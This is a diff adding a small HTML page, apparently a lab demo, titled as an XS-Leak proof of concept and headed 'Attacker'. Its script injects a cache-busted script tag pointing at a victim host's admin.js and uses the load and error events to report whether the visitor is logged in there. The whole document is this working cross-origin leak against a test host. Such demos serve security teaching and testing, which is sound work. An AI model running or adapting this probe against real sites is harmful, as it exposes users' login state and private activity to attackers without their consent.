@@ -1,0 +1,36 @@
+<!doctype html>
+<html>
+<head>
+  <meta charset="utf-8">
+  <title>XS-Leak Demo (same-site, cross-origin)</title>
+  <style>
+    body { font-family: system-ui, sans-serif; margin: 2rem; }
+    button { padding: .6rem 1rem; font-size: 1rem; }
+    #result { margin-top: 1rem; font-weight: 700; }
+    code { background: #f2f2f2; padding: .1rem .3rem; border-radius: 6px; }
+  </style>
+</head>
+<body>
+  <h1>Attacker</h1>
+  <p>Probe: <code>http://victim.xsleak.test:5000/admin.js</code></p>
+  <button id="probe">Probe login state</button>
+  <div id="result"></div>
+
+  <script>
+    const result = document.getElementById('result');
+
+    document.getElementById('probe').addEventListener('click', () => {
+      // cache-bust so you always hit the server
+      const url = 'http://victim.xsleak.test:5000/admin.js?cb=' + Date.now() + '-' + Math.random();
+
+      const s = document.createElement('script');
+      s.src = url;
+
+      s.onload = () => result.textContent = 'Loaded (HTTP 200) → victim is logged in';
+      s.onerror = () => result.textContent = 'Error (HTTP 404) → victim is NOT logged in';
+
+      document.head.appendChild(s);
+    });
+  </script>
+</body>
+</html>
